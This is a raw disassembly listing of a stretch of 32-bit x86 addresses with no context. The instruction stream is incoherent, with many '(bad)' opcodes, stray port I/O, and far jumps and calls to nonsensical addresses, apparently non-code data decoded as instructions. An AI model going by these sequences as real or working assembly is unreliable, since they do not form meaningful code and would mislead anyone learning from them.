  42046c:	fs stos DWORD PTR es:[edi],eax
  42046e:	fdivr  DWORD PTR [edx-0x3418e2cb]
  420474:	(bad)  
  420475:	dec    cl
  420477:	lds    esi,FWORD PTR es:[ecx]
  42047a:	sbb    ebx,DWORD PTR [edi-0x7a74417d]
  420480:	or     dl,BYTE PTR [esi+0x39fe1b40]
  420486:	fst    DWORD PTR [eax-0x69]
  420489:	mov    eax,0xc8dcf802
  42048e:	gs loop 0x42042b
  420491:	sbb    al,ch
  420493:	push   ds
  420494:	aad    0xa1
  420496:	jmp    0x4d8a4a1e
  42049b:	nop
  42049c:	mov    BYTE PTR [edi+0x52ed2f57],al
  4204a2:	je     0x42048a
  4204a4:	jp     0x42042e
  4204a6:	mov    ah,0xe4
  4204a8:	stc    
  4204a9:	sub    BYTE PTR [eax+0x4],bh
  4204ac:	cmp    eax,0xd5f57ce8
  4204b1:	add    DWORD PTR [edx-0x1e],ebp
  4204b4:	addr16 jp 0x4204d9
  4204b7:	icebp  
  4204b8:	(bad)  
  4204ba:	es inc eax
  4204bc:	in     al,0x28
  4204be:	push   edx
  4204bf:	dec    ebx
  4204c0:	loopne 0x420487
  4204c2:	aaa    
  4204c3:	add    al,0xff
  4204c5:	mov    edi,DWORD PTR [ecx]
  4204c7:	add    ah,bl
  4204c9:	std    
  4204ca:	in     eax,dx
  4204cb:	mov    esp,0x548fdfe6
  4204d0:	lahf   
  4204d1:	push   esi
  4204d2:	mov    ebx,0x8f0443f5
  4204d7:	jae    0x4204de
  4204d9:	push   ebp
  4204da:	jecxz  0x420473
  4204dc:	cmp    eax,0x78949728
  4204e1:	xlat   BYTE PTR ds:[ebx]
  4204e2:	sbb    DWORD PTR [edx+0x45],edx
  4204e5:	ffreep st(3)
  4204e7:	add    eax,0x46275ee6
  4204ec:	xor    eax,0xa65665dc
  4204f1:	rcr    eax,cl
  4204f3:	inc    edi
  4204f4:	xchg   edi,eax
  4204f5:	std    
  4204f6:	cmc    
  4204f7:	popa   
  4204f8:	cwde   
  4204f9:	test   BYTE PTR [edx+0x73],dh
  4204fc:	das    
  4204fd:	add    al,BYTE PTR [ebp+0x707fe90b]
  420503:	mov    ah,0x84
  420505:	clc    
  420506:	jp     0x420531
  420508:	pop    ebp
  420509:	sub    eax,0xfe433848
  42050e:	jo     0x4204a7
  420510:	jl     0x420581
  420512:	in     al,dx
  420513:	sub    al,0xc9
  420515:	div    esi
  420517:	jl     0x420576
  420519:	pop    edi
  42051a:	fs in  al,dx
  42051c:	mov    esi,0x9b2fd877
  420521:	cmp    edx,DWORD PTR [ebx]
  420523:	in     eax,dx
  420524:	dec    ecx
  420525:	in     al,dx
  420526:	(bad)  
  420527:	inc    edi
  420528:	adc    al,0x7b
  42052a:	cmp    eax,0x248c0c8b
  42052f:	fimul  WORD PTR [edx-0x65a0a367]
  420535:	pop    es
  420536:	sbb    DWORD PTR [ebx+0x53edc1f7],0x5ef0a0d7
  420540:	jecxz  0x42056a
  420542:	icebp  
  420543:	lods   eax,DWORD PTR ds:[esi]
  420544:	and    BYTE PTR [edx],dl
  420546:	fild   WORD PTR [edi-0x29533a53]
  42054c:	int3   
  42054d:	pop    ss
  42054e:	mov    ebx,0x5ee951fb
  420553:	es mov dl,0x2a
  420556:	call   0xa396ef5a
  42055b:	aad    0xfc
  42055d:	fcmovu st,st(2)
  42055f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420560:	addr16 ret 0x83ed
  420564:	cld    
  420565:	push   eax
  420566:	aam    0x9b
  420568:	mov    WORD PTR [ebx+ecx*8],ds
  42056b:	adc    BYTE PTR [esi+0x549c9b65],0xaf
  420572:	test   DWORD PTR [esi],0x339f7f50
  420578:	js     0x42051a
  42057a:	mov    al,ds:0x890a7b0e
  42057f:	pop    ecx
  420580:	loop   0x42055d
  420582:	fcom   DWORD PTR [ebx]
  420584:	ja     0x420507
  420586:	mov    ch,0x39
  420588:	dec    edx
  420589:	fcmovnu st,st(7)
  42058b:	mov    ebx,0xae866d3f
  420590:	mov    edi,cs
  420592:	jmp    0xba7bc2f9
  420597:	ret    
  420598:	or     eax,0x8453de81
  42059d:	sub    BYTE PTR [ecx+ecx*1+0x5ba81df8],dl
  4205a4:	mov    edi,0xa06e524e
  4205a9:	je     0x420550
  4205ab:	sbb    eax,eax
  4205ad:	pop    ss
  4205ae:	bound  edi,QWORD PTR [esi+0x44]
  4205b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205b2:	cmp    edx,DWORD PTR [ecx+esi*2]
  4205b5:	sbb    al,0xcb
  4205b7:	(bad)  
  4205b8:	pop    ds
  4205b9:	popw   ss
  4205bb:	pop    eax
  4205bc:	jno    0x4205db
  4205be:	icebp  
  4205bf:	rcr    BYTE PTR [esi+0x3a],0xd8
  4205c3:	icebp  
  4205c4:	out    dx,eax
  4205c5:	push   edx
  4205c6:	mov    al,ds:0xb7e25384
  4205cb:	cmp    BYTE PTR [eax+ebx*1],ah
  4205ce:	sub    BYTE PTR [ecx-0x7e],ch
  4205d1:	sbb    al,0x6c
  4205d3:	push   0x14
  4205d5:	sub    BYTE PTR [esi],bl
  4205d7:	je     0x420563
  4205d9:	mov    bl,0xb0
  4205db:	test   al,0xd3
  4205dd:	sub    BYTE PTR [ecx+0x79],al
  4205e0:	jg     0x4205b9
  4205e2:	es or  al,0x22
  4205e5:	jmp    0x886e567c
  4205ea:	or     edx,DWORD PTR ds:0xaf1b9fdf
  4205f0:	cli    
  4205f1:	jp     0x420597
  4205f3:	mov    ch,0x8d
  4205f5:	imul   ecx,eax,0xe6823e21
  4205fb:	mov    eax,ds:0xdbc6f44a
  420600:	pusha  
  420601:	cdq    
  420602:	push   ebx
  420603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420604:	test   DWORD PTR [ecx],ecx
  420606:	pop    ebx
  420607:	mov    cl,0xaa
  420609:	jge    0x420611
  42060b:	icebp  
  42060c:	mov    esp,0xcef50623
  420611:	fcmovbe st,st(3)
  420613:	aaa    
  420614:	xor    ah,BYTE PTR [edx-0x319b38d6]
  42061a:	xchg   edi,eax
  42061b:	aaa    
  42061c:	popf   
  42061d:	pop    ecx
  42061e:	dec    esp
  42061f:	das    
  420620:	mov    al,ds:0xa88a2c38
  420625:	call   0xefc5e4a5
  42062a:	push   ecx
  42062b:	sbb    bh,BYTE PTR [ebp-0x70]
  42062e:	sub    esi,edx
  420630:	fdiv   st,st(5)
  420632:	cmp    BYTE PTR [edx-0x53],al
  420635:	test   al,0xc7
  420637:	outs   dx,DWORD PTR ds:[esi]
  420638:	jmp    0x420696
  42063a:	xchg   ch,al
  42063c:	fisub  DWORD PTR [edx+eiz*1+0x690a0250]
  420643:	dec    edx
  420644:	lock fcmove st,st(3)
  420647:	add    al,0x5a
  420649:	cdq    
  42064a:	out    dx,al
  42064b:	outs   dx,BYTE PTR ds:[esi]
  42064c:	adc    ch,dh
  42064e:	pop    ss
  42064f:	mov    al,0x95
  420651:	out    dx,eax
  420652:	cs js  0x4206cf
  420655:	dec    edi
  420656:	sub    eax,0xb8ca8db8
  42065b:	jne    0x42066d
  42065d:	dec    edx
  42065e:	outs   dx,DWORD PTR ds:[esi]
  42065f:	adc    eax,DWORD PTR [ebx-0x5c73ca32]
  420665:	push   es
  420666:	in     eax,0xda
  420668:	or     ch,BYTE PTR [ebx-0x51e42f55]
  42066e:	adc    ecx,DWORD PTR [esi+0xf94f25]
  420674:	mov    ebp,0xc5697fe4
  420679:	pusha  
  42067a:	sbb    DWORD PTR [edx+0x7c6a1070],0x49
  420681:	xchg   esp,eax
  420682:	out    dx,al
  420683:	mov    ah,0x64
  420685:	aas    
  420686:	(bad)  
  420687:	pop    eax
  420688:	xor    eax,DWORD PTR [edx+0xda29b74]
  42068e:	or     bl,BYTE PTR [ebx-0x3d]
  420691:	mov    edi,0xb5a84de5
  420696:	sbb    BYTE PTR [ebp-0x54eed138],al
  42069c:	in     eax,dx
  42069d:	add    BYTE PTR [eax-0x22188b2d],dh
  4206a3:	pop    edx
  4206a4:	inc    ecx
  4206a5:	push   ebx
  4206a7:	jbe    0x420687
  4206a9:	lock jmp 0xebe:0xd16258ad
  4206b1:	mov    ebp,ecx
  4206b3:	sbb    ebp,DWORD PTR [esi+0x37]
  4206b6:	stos   BYTE PTR es:[edi],al
  4206b7:	mov    ds:0x39d3b47a,al
  4206bc:	push   cs
  4206bd:	fdivr  QWORD PTR [edi-0x69739eb8]
  4206c3:	cld    
  4206c4:	xchg   esp,eax
  4206c5:	(bad)  
  4206c7:	sbb    esp,esi
  4206c9:	mov    eax,ds:0x3e5eb1f0
  4206ce:	enter  0xaa2f,0x71
  4206d2:	sub    ch,BYTE PTR [edi+0x5f2d9e54]
  4206d8:	pop    ss
  4206d9:	mov    dl,al
  4206db:	out    0x1c,al
  4206dd:	xor    eax,0x5ec4709a
  4206e2:	xlat   BYTE PTR ds:[ebx]
  4206e3:	xor    esp,edx
  4206e5:	cli    
  4206e6:	in     al,dx
  4206e7:	cmp    BYTE PTR [edi+0x2a79c97f],ch
  4206ed:	ficomp WORD PTR [edi]
  4206ef:	rol    DWORD PTR [ecx+0x7b],1
  4206f2:	rol    DWORD PTR [ecx-0x40888092],1
  4206f8:	addr16 ja 0x4206eb
  4206fb:	pusha  
  4206fc:	dec    ecx
  4206fd:	rol    BYTE PTR [esi],0x7a
  420700:	iret   
  420701:	push   0xbfe13bbb
  420706:	add    eax,0x44d2d4a7
  42070b:	inc    eax
  42070c:	mov    eax,ds:0x2b73730b
  420711:	vpaddd ymm4,ymm0,YMMWORD PTR [ebp+0x11b8fe71]
  420719:	mov    edi,0xcab7e3ca
  42071e:	cmp    BYTE PTR [ecx+0x4a57b504],dl
  420724:	leave  
  420725:	div    DWORD PTR [ebx-0xb]
  420728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420729:	mov    eax,ds:0x6e0aa156
  42072e:	mov    cl,0xae
  420730:	and    eax,0xa3437435
  420735:	sub    ch,dh
  420737:	scas   eax,DWORD PTR es:[edi]
  420738:	push   edi
  420739:	dec    ebx
  42073a:	cmp    BYTE PTR [ebx-0x34a133f9],ah
  420740:	ficom  WORD PTR es:[ebx+edi*8-0x37ea2c5e]
  420748:	or     eax,0xa267509c
  42074d:	nop
  42074e:	das    
  42074f:	cwde   
  420750:	(bad)  
  420752:	in     eax,0xbc
  420754:	ficomp WORD PTR [esi]
  420756:	fwait
  420757:	jecxz  0x4207ba
  420759:	cli    
  42075a:	(bad)
  42075e:	push   ebx
  42075f:	mov    eax,ds:0x87633823
  420764:	mov    ebp,0xd7da8484
  420769:	shl    DWORD PTR [eax-0x65],1
  42076c:	icebp  
  42076d:	inc    esp
  42076e:	(bad)  
  42076f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420770:	jl     0x420710
  420772:	xor    bh,BYTE PTR [edx]
  420774:	pop    edx
  420775:	cwde   
  420776:	and    BYTE PTR [eax],cl
  420778:	mov    esp,0x6f490c58
  42077d:	popf   
  42077e:	pop    esp
  42077f:	push   ecx
  420780:	rol    BYTE PTR [edx],1
  420782:	and    edx,DWORD PTR [ecx+0x38]
  420785:	dec    edx
  420786:	loope  0x420733
  420788:	jno    0x4207ee
  42078a:	pop    esp
  42078b:	ret    
  42078c:	dec    ecx
  42078d:	ds js  0x42077b
  420790:	xchg   esp,eax
  420791:	jle    0x420774
  420793:	les    esp,FWORD PTR [ebp+0x56855cd7]
  420799:	mov    dh,0x4
  42079c:	cmp    ch,BYTE PTR [edi]
  42079e:	mov    BYTE PTR [edx+0x20],bh
  4207a1:	aad    0xc7
  4207a3:	shr    DWORD PTR [ebp+0x1d9e76d5],cl
  4207a9:	lock xor BYTE PTR [esi+0x506d65d8],0x75
  4207b1:	out    0x59,eax
  4207b3:	add    eax,0x54db626f
  4207b8:	add    dh,BYTE PTR [ebx]
  4207ba:	dec    eax
  4207bb:	aam    0x32
  4207bd:	mov    ch,bl
  4207bf:	jg     0x42083c
  4207c1:	fstp   TBYTE PTR [ebx-0x4447c6b1]
  4207c7:	mov    eax,0x115afbf0
  4207cc:	adc    BYTE PTR [esi-0x5fb24ad8],bl
  4207d2:	adc    BYTE PTR [esi],bl
  4207d4:	pop    edx
  4207d5:	lea    eax,ss:[edx-0x32197e78]
  4207dc:	inc    ecx
  4207dd:	push   0x77e7ab21
  4207e2:	cmp    dl,bh
  4207e4:	retf   0x2eba
  4207e7:	(bad)  [edx-0x2fac4d86]
  4207ed:	sahf   
  4207ee:	sbb    BYTE PTR [edx+0x75],al
  4207f1:	mov    DWORD PTR [ecx+0x3],edi
  4207f4:	push   ecx
  4207f5:	(bad)  
  4207f6:	fwait
  4207f7:	jp     0x4207c2
  4207f9:	xor    DWORD PTR [edi],esp
  4207fb:	iret   
  4207fc:	imul   DWORD PTR [eax-0x5b]
  4207ff:	jle    0x42086a
  420801:	jp     0x4207f1
  420803:	or     al,0x46
  420805:	test   eax,0xc9b43a74
  42080a:	push   ecx
  42080b:	and    DWORD PTR [edx],esp
  42080d:	push   esi
  42080e:	ins    DWORD PTR es:[edi],dx
  42080f:	fmul   QWORD PTR [ecx]
  420811:	mov    ebp,0xa28b97bb
  420816:	das    
  420817:	adc    eax,0x6a9eff7e
  42081c:	repz mov cl,0x53
  42081f:	jp     0x42083d
  420821:	nop
  420822:	hlt    
  420823:	ror    BYTE PTR ds:0x20d10c2,1
  420829:	mov    bl,0xb9
  42082b:	jmp    0xfd9c4bf6
  420830:	retf   0xa1d
  420833:	or     BYTE PTR [edi],ah
  420835:	clc    
  420836:	cmc    
  420837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420838:	out    0xbe,al
  42083a:	iret   
  42083b:	jno    0x4208b5
  42083d:	mov    ds:0x7df300b6,al
  420842:	push   ebp
  420843:	pop    ebp
  420844:	repz or ebx,ecx
  420847:	mov    WORD PTR [eax],gs
  420849:	mov    ch,0x29
  42084b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084c:	sub    edx,ecx
  42084e:	ins    DWORD PTR es:[edi],dx
  42084f:	mov    ecx,0xb5e4b425
  420854:	sbb    BYTE PTR [ebp+eax*2-0x67d34b11],0x20
  42085c:	les    esp,FWORD PTR [edx+edi*1+0x66]
  420860:	mov    ebx,0xef2e10e
  420865:	in     al,dx
  420866:	pop    esi
  420867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420868:	jmp    0xcba3574a
  42086d:	outs   dx,DWORD PTR ds:[esi]
  42086e:	xchg   esp,eax
  42086f:	rol    ch,cl
  420871:	push   edx
  420872:	mov    ch,0x59
  420874:	adc    eax,0x48677139
  420879:	gs (bad) 
  42087b:	mov    esi,0x99605b39
  420880:	cs fs nop
  420883:	cmp    ebp,ecx
  420885:	sub    BYTE PTR [eax-0x57e3076a],ch
  42088b:	pop    ds
  42088c:	sbb    bh,dh
  42088e:	mov    ebp,0x5814eff4
  420893:	cli    
  420894:	retf   
  420895:	cmp    BYTE PTR [edx+0x3040ced2],0xbe
  42089c:	push   edi
  42089d:	jns    0x420885
  42089f:	leave  
  4208a0:	call   0x5808:0xdfd3a202
  4208a7:	xor    bh,dh
  4208a9:	lock cmpxchg DWORD PTR cs:[ebp+0x51f7250c],ecx
  4208b2:	sub    DWORD PTR [ebx-0x4],ecx
  4208b5:	ds push ebx
  4208b7:	shl    DWORD PTR [esp+esi*8+0x72365970],0x74
  4208bf:	jmp    0x420885
  4208c1:	sahf   
  4208c2:	sub    eax,0x8d6bd0d5
  4208c7:	gs stos DWORD PTR es:[edi],eax
  4208c9:	(bad)  
  4208ca:	sti    
  4208cb:	repz gs gs jg 0x420887
  4208d0:	or     bh,bl
  4208d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208d3:	aad    0x90
  4208d5:	pop    esi
  4208d6:	jmp    0x40b6:0xc63e51cb
  4208dd:	sbb    ebp,ecx
  4208df:	cmp    ah,BYTE PTR [edx+0x34098cb5]
  4208e5:	and    al,0x63
  4208e7:	xor    dl,BYTE PTR [edi-0x539ffaa]
  4208ed:	daa    
  4208ee:	sbb    DWORD PTR [eax-0x2a],ebx
  4208f1:	fs cmp eax,0x53ac37d6
  4208f7:	pop    ss
  4208f8:	test   bl,dl
  4208fa:	push   cs
  4208fb:	cmc    
  4208fc:	add    eax,0xacebfbc4
  420901:	add    esp,edi
  420903:	push   cs
  420904:	ins    BYTE PTR es:[edi],dx
  420905:	push   ebp
  420906:	mov    ch,0x8c
  420908:	mov    DWORD PTR [ebp+eax*8-0x65],esi
  42090c:	push   ebp
  42090d:	sub    eax,0xf6915d6d
  420912:	lods   eax,DWORD PTR ds:[esi]
  420913:	add    DWORD PTR [eax+0x63],0xfffffffb
  420917:	inc    esp
  420918:	mov    esi,0xf362485c
  42091d:	mov    WORD PTR [ebx],ss
  42091f:	lock scas eax,DWORD PTR es:[edi]
  420921:	xor    edx,DWORD PTR [edi-0x4f]
  420924:	add    BYTE PTR [edi],0x31
  420927:	mov    ecx,DWORD PTR [esi+ecx*1-0x1859fa33]
  42092e:	lock ficom WORD PTR [eax]
  420931:	jnp    0x420961
  420933:	fstp   TBYTE PTR [ecx+0x642c2685]
  420939:	repnz arpl WORD PTR [ebx+ecx*4],dx
  42093d:	sbb    bh,BYTE PTR [edx+ecx*4]
  420940:	push   ebp
  420941:	or     esp,DWORD PTR [edx+0x23356128]
  420947:	sbb    eax,0x7f69cc17
  42094c:	in     eax,0x92
  42094e:	inc    edx
  42094f:	(bad)  
  420950:	fnstcw WORD PTR [eax]
  420952:	cmp    ah,BYTE PTR [edx]
  420954:	fisttp QWORD PTR [ecx-0x6a]
  420957:	scas   eax,DWORD PTR es:[edi]
  420958:	sbb    DWORD PTR [ebx-0x5b],edx
  42095b:	fsub   DWORD PTR [edx]
  42095d:	jl     0x42096f
  42095f:	add    cl,BYTE PTR [ecx+0x63]
  420962:	mov    cl,0x66
  420964:	js     0x42098b
  420966:	call   0x5f06:0x4a443cf8
  42096d:	pop    ecx
  42096e:	ins    DWORD PTR es:[edi],dx
  42096f:	sbb    DWORD PTR ds:0x5ec379ff,edi
  420975:	lods   eax,DWORD PTR ds:[esi]
  420976:	add    bl,BYTE PTR [ebx]
  420978:	(bad)  
  420979:	(bad)  
  42097a:	or     BYTE PTR ds:[esi],ah
  42097d:	sbb    DWORD PTR [esi],0x5fe8e137
  420983:	les    ebp,FWORD PTR [esi-0x6d]
  420986:	xchg   ebp,eax
  420987:	cmp    cl,BYTE PTR cs:[esi+0x4f10aac4]
  42098e:	sbb    dh,BYTE PTR [eax+0x39]
  420991:	push   esi
  420992:	add    DWORD PTR [esi-0x22],ecx
  420995:	xchg   ebx,eax
  420996:	and    al,BYTE PTR [ecx+0x7f]
  420999:	push   es
  42099a:	cmp    eax,0xfe93d46e
  42099f:	mov    edi,0x202f6f62
  4209a4:	add    eax,0x98fbba77
  4209a9:	test   al,0xdf
  4209ab:	jno    0x42096a
  4209ad:	idiv   BYTE PTR ds:0x334efdb5
  4209b3:	and    BYTE PTR [edi+0x5a5f9866],dl
  4209b9:	sbb    esp,edx
  4209bb:	fmul   QWORD PTR [edx+edi*2]
  4209be:	pop    esp
  4209bf:	lea    esp,[ebp-0x35385f41]
  4209c5:	pop    eax
  4209c6:	xor    BYTE PTR [edx-0x6b2700a5],bl
  4209cc:	in     eax,0x77
  4209ce:	stos   DWORD PTR es:[edi],eax
  4209cf:	rcr    DWORD PTR [edx-0x6d],0xfc
  4209d3:	xlat   BYTE PTR ds:[ebx]
  4209d4:	mov    cl,0xae
  4209d6:	mul    BYTE PTR [ebx]
  4209d8:	je     0x420a10
  4209da:	adc    DWORD PTR [eax-0x743d7d2b],edi
  4209e0:	push   eax
  4209e1:	in     eax,0x1b
  4209e3:	jmp    0x4209df
  4209e5:	pop    esp
  4209e6:	add    eax,edi
  4209e8:	repnz sbb edi,ebx
  4209eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ec:	inc    ebx
  4209ed:	popf   
  4209ee:	jmp    0xcd0e:0x5d6fbcc1
  4209f5:	dec    edi
  4209f6:	in     eax,dx
  4209f7:	mov    eax,ds:0xf9969e65
  4209fc:	aas    
  4209fd:	outs   dx,DWORD PTR ds:[esi]
  4209fe:	cmp    al,dl
  420a00:	call   FWORD PTR [edx+edx*1-0x7589044f]
  420a07:	xlat   BYTE PTR ds:[ebx]
  420a08:	mov    ebp,0x35d899fb
  420a0d:	rcl    BYTE PTR [ecx+0x31],1
  420a10:	rcl    BYTE PTR [ebx],cl
  420a12:	sar    DWORD PTR [edx-0x4c],1
  420a15:	lahf   
  420a16:	sbb    ebp,DWORD PTR [edi]
  420a18:	or     eax,0xa32ade92
  420a1d:	mov    dh,0x94
  420a1f:	sbb    al,0x7f
  420a21:	cmp    DWORD PTR [bp+0x1e0],0x13
  420a27:	and    al,0xcd
  420a29:	mov    WORD PTR [edx],sp
  420a2c:	cwde   
  420a2d:	sub    BYTE PTR [esi+0x79],ah
  420a30:	push   edx
  420a31:	xor    dh,ah
  420a33:	xchg   BYTE PTR [edx+ebx*8-0x69],dl
  420a37:	or     bl,bl
  420a39:	in     eax,0x94
  420a3b:	scas   eax,DWORD PTR es:[edi]
  420a3c:	test   BYTE PTR [ebx-0x69],al
  420a3f:	pop    ebx
  420a40:	call   DWORD PTR [eax-0x16ef5aa1]
  420a46:	mov    esi,0x9f8fbb3e
  420a4b:	xlat   BYTE PTR ds:[ebx]
  420a4c:	lods   al,BYTE PTR ds:[esi]
  420a4d:	jge    0x4209db
  420a4f:	mov    al,0x3a
  420a51:	xor    DWORD PTR ds:0xacabf70a,ecx
  420a57:	test   DWORD PTR [eax+0x5c],esp
  420a5a:	jo     0x4209eb
  420a5c:	jmp    0x420a8d
  420a5e:	dec    ebp
  420a5f:	cdq    
  420a60:	cli    
  420a61:	dec    esp
  420a62:	arpl   WORD PTR [eax],ax
  420a64:	sub    dh,BYTE PTR [ebx+0x2b6890]
  420a6a:	sbb    al,0x76
  420a6c:	sti    
  420a6d:	or     DWORD PTR [edx-0x7c],esp
  420a70:	lods   al,BYTE PTR ds:[esi]
  420a71:	mov    dh,0xa1
  420a73:	mov    eax,0xb82d576
  420a78:	mov    bh,0x77
  420a7a:	jns    0x420a10
  420a7c:	jne    0x420a3d
  420a7e:	adc    DWORD PTR [esi+0xf],eax
  420a81:	xchg   esi,eax
  420a82:	ds xor dl,ch
  420a85:	or     ebx,ecx
  420a87:	lock out dx,eax
  420a89:	std    
  420a8a:	push   es
  420a8b:	dec    eax
  420a8c:	ret    0xfb76
  420a8f:	out    dx,al
  420a90:	mov    edx,DWORD PTR [ecx+0x1]
  420a93:	adc    BYTE PTR [ecx+eiz*4-0x7ce66c4c],dh
  420a9a:	in     al,0xfd
  420a9c:	call   0x9647b1eb
  420aa1:	xchg   esi,eax
  420aa2:	cmp    BYTE PTR [ebx+0xa72ce33],bl
  420aa8:	in     eax,dx
  420aa9:	mov    BYTE PTR [ebp+0x1b],ah
  420aac:	in     al,0x49
  420aae:	sbb    eax,0x3531d583
  420ab3:	arpl   dx,ax
  420ab5:	ja     0x420afd
  420ab7:	pushw  ds
  420ab9:	jg     0x420b1c
  420abb:	push   ebp
  420abc:	inc    esp
  420abd:	pusha  
  420abe:	mov    edx,0xeebca05b
  420ac3:	adc    al,0x1d
  420ac5:	pop    esp
  420ac6:	push   es
  420ac7:	xchg   ecx,eax
  420ac8:	test   al,0x9
  420aca:	aad    0xca
  420acc:	cwde   
  420acd:	mov    ebp,gs
  420acf:	sti    
  420ad0:	inc    ebp
  420ad1:	nop
  420ad2:	jl     0x420b2e
  420ad4:	dec    esi
  420ad5:	pop    ebp
  420ad6:	stc    
  420ad7:	jnp    0x420a62
  420ad9:	push   es
  420ada:	inc    esi
  420adb:	cmp    ebx,DWORD PTR ds:0xaef59343
  420ae1:	pop    eax
  420ae2:	fadd   DWORD PTR [edi+0x413b0a1e]
  420ae8:	inc    esp
  420ae9:	retf   0x1037
  420aec:	rol    ch,0x77
  420aef:	jns    0x420ae1
  420af1:	jb     0x420b01
  420af3:	repz inc edi
  420af5:	xchg   esp,eax
  420af6:	fcomp  QWORD PTR [edi+0x35c30461]
  420afc:	mov    edx,0x54d1ed83
  420b01:	loope  0x420a98
  420b03:	shr    DWORD PTR [ebx+0x70],0xc2
  420b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b08:	ret    0xefd3
  420b0b:	rcr    BYTE PTR cs:[edi-0x61],1
  420b0f:	push   esp
  420b10:	jbe    0x420b38
  420b12:	sbb    dh,bl
  420b14:	inc    edx
  420b15:	mov    WORD PTR [edi+0x129a446a],gs
  420b1b:	dec    di
  420b1d:	sbb    ebx,DWORD PTR [edx]
  420b1f:	xor    al,0xd8
  420b21:	arpl   WORD PTR [ebp+0x5b4a2c95],bx
  420b27:	in     al,dx
  420b28:	jge    0x420b23
  420b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b2b:	and    BYTE PTR [ebp-0x59572b7],al
  420b31:	or     al,0xef
  420b33:	dec    edi
  420b34:	xchg   ecx,eax
  420b35:	jno    0x420b57
  420b37:	retf   0x7f0c
  420b3a:	sbb    al,0xfd
  420b3c:	imul   esi,DWORD PTR [ebp+0x50],0x43
  420b40:	mov    eax,0x32e81b96
  420b45:	jmp    0xd2fbbd51
  420b4a:	sbb    bh,dl
  420b4c:	adc    edx,DWORD PTR [edi+0x70]
  420b4f:	mov    al,ds:0xfca81b10
  420b54:	imul   ecx,edx,0xffffffc6
  420b57:	push   edx
  420b58:	out    0x10,eax
  420b5a:	(bad)  
  420b5b:	rcr    BYTE PTR [edi-0x14],0xd9
  420b5f:	fld    TBYTE PTR [edi]
  420b61:	jp     0x420bd2
  420b63:	aad    0x6e
  420b65:	pop    ds
  420b66:	test   BYTE PTR [ebx],0xa7
  420b69:	jmp    0x42043a09
  420b6e:	add    edx,ebx
  420b70:	es jecxz 0x420b4b
  420b73:	push   esp
  420b74:	gs cmp eax,0x23fb1ad7
  420b7a:	into   
  420b7b:	les    ecx,FWORD PTR ds:0xf7e9ecf9
  420b81:	lods   eax,DWORD PTR ds:[esi]
  420b82:	pop    ebp
  420b83:	mov    ?,ebx
  420b85:	mov    bl,BYTE PTR [ebp+0x2b]
  420b88:	add    bh,BYTE PTR [eax+0x1152283e]
  420b8e:	sub    BYTE PTR [ebp+0x2013c966],bh
  420b94:	xchg   edx,eax
  420b95:	sbb    ecx,ebx
  420b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b98:	in     al,dx
  420b99:	and    eax,0xf05bb0ed
  420b9e:	loop   0x420bb9
  420ba0:	ficom  WORD PTR [eax-0x78]
  420ba3:	fist   WORD PTR [esi+ebx*1]
  420ba6:	sbb    DWORD PTR [eax+0x33],edx
  420ba9:	ror    DWORD PTR [ecx],cl
  420bab:	pushf  
  420bac:	out    0x45,eax
  420bae:	fldenv [ebp+0x18bd0f4f]
  420bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bb5:	ds fwait
  420bb7:	ret    0xad7e
  420bba:	xchg   edx,eax
  420bbb:	pop    es
  420bbc:	push   ss
  420bbd:	popa   
  420bbe:	int3   
  420bbf:	int    0x52
  420bc1:	mov    ebx,DWORD PTR [eax-0x34176cb8]
  420bc7:	dec    ecx
  420bc8:	fdivr  QWORD PTR fs:[esi+0x7b]
  420bcc:	mov    al,ds:0xddb5904a
  420bd1:	mov    ebx,DWORD PTR [esi]
  420bd3:	inc    esi
  420bd4:	(bad)  
  420bd5:	out    dx,eax
  420bd6:	imul   esp,ecx,0x43
  420bd9:	cs clc 
  420bdb:	outs   dx,BYTE PTR ds:[esi]
  420bdc:	mov    WORD PTR [edx+0x44],gs
  420bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420be0:	call   FWORD PTR [esi+0x4bf08b78]
  420be6:	mov    dh,0xce
  420be8:	dec    ebp
  420be9:	aaa    
  420bea:	cld    
  420beb:	pop    ebx
  420bec:	out    0x94,eax
  420bee:	and    DWORD PTR [ebx],0x73
  420bf1:	fcmovnbe st,st(2)
  420bf3:	in     eax,dx
  420bf4:	retf   
  420bf5:	cli    
  420bf6:	fimul  WORD PTR [esi+eax*4]
  420bf9:	test   al,0xd7
  420bfb:	setge  al
  420bfe:	or     esi,edx
  420c00:	in     al,dx
  420c01:	call   0x25202a06
  420c06:	jns    0x420c5f
  420c08:	cmp    eax,0x622557ee
  420c0d:	ins    BYTE PTR es:[edi],dx
  420c0e:	fld    QWORD PTR [ecx-0x1d50b20f]
  420c14:	mov    WORD PTR [ebx-0x5ea30ac0],ss
  420c1a:	push   ecx
  420c1b:	mov    DWORD PTR [esi-0x76ffdd4f],eax
  420c21:	ds push ecx
  420c23:	mov    bl,0xb2
  420c25:	aas    
  420c26:	jmp    0xbdc12d98
  420c2b:	(bad)  
  420c2d:	aas    
  420c2e:	jb     0x420c17
  420c30:	jbe    0x420c54
  420c32:	sbb    DWORD PTR [edx],ebp
  420c34:	leave  
  420c35:	lahf   
  420c36:	icebp  
  420c37:	push   esp
  420c38:	adc    al,0xb6
  420c3a:	je     0x420c03
  420c3c:	test   BYTE PTR [eax+0x46],al
  420c3f:	mov    ch,0x6a
  420c41:	or     al,0x24
  420c43:	je     0x420c68
  420c45:	(bad)  
  420c46:	pop    esi
  420c47:	mov    eax,0xf798c4f8
  420c4c:	sbb    ah,cl
  420c4e:	aas    
  420c4f:	mov    bh,0x7a
  420c51:	xor    BYTE PTR [edx+0x27cdde65],dh
  420c57:	inc    ebx
  420c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c59:	(bad)  
